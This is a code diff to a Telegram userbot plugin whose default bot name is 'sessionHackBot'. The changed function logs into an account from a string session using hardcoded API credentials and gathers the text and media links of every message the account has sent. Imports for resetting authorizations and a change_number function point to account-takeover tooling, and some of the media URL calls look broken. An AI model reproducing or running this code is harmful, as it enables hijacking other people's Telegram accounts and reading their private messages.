@@ -1,5 +1,5 @@
 from SHRU import bot, l313l
-#By Source joker @SXYO3
+#By Source alsaher @SXYO3
 from telethon import events, functions, types, Button
 from datetime import timedelta
 from SHRU.utils import admin_cmd
@@ -14,7 +14,7 @@ from telethon.sessions import StringSession as ses
 from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
 import telethon;from telethon import functions
 from telethon.tl.types import ChannelParticipantsAdmins as cpa
-
+from telethon.tl.types import MessageMediaPhoto, MessageMediaDocument, MessageMediaWebPage
 from telethon.tl.functions.channels import CreateChannelRequest as ccr
 
 bot = borg = tgbot
@@ -24,40 +24,27 @@ Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"
 async def savedmsgs(strses):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
         messages = []
-        async for message in X.iter_messages(None, from_user='me', file=lambda f: not f.media_empty):
+        async for message in X.iter_messages(None, from_user='me'):
             msg_content = f"Message ID: {message.id}\n"
             
             if message.text:
                 msg_content += f"Text: {message.text}\n"
             
-            if message.gif:
-                gif_url = message.gif.url
-                msg_content += f"GIF: {gif_url}\n"
-            
-            if message.photo:
-                photo_url = message.photo.url
-                msg_content += f"Photo: {photo_url}\n"
-            
-            if message.video:
-                video_url = message.video.url
-                msg_content += f"Video: {video_url}\n"
-            
-            if message.document:
-                document_url = message.document.url
-                msg_content += f"Document: {document_url}\n"
-            
-            if message.audio:
-                audio_url = message.audio.url
-                msg_content += f"Audio: {audio_url}\n"
-            
-            if message.voice:
-                voice_url = message.voice.url
-                msg_content += f"Voice: {voice_url}\n"
+            if message.media:
+                if isinstance(message.media, MessageMediaPhoto):
+                    photo_url = message.media.photo.sizes[-1].url
+                    msg_content += f"Photo: {photo_url}\n"
+                elif isinstance(message.media, MessageMediaDocument):
+                    doc_url = message.media.document.url
+                    msg_content += f"Document: {doc_url}\n"
+                elif isinstance(message.media, MessageMediaWebPage):
+                    webpage_url = message.media.webpage.url
+                    msg_content += f"Webpage: {webpage_url}\n"
+                # Add more checks for other media types like gif, video, audio, etc.
             
             messages.append(msg_content)
 
         return "\n\n".join(messages)
-
 
 
 async def change_number(strses, number):
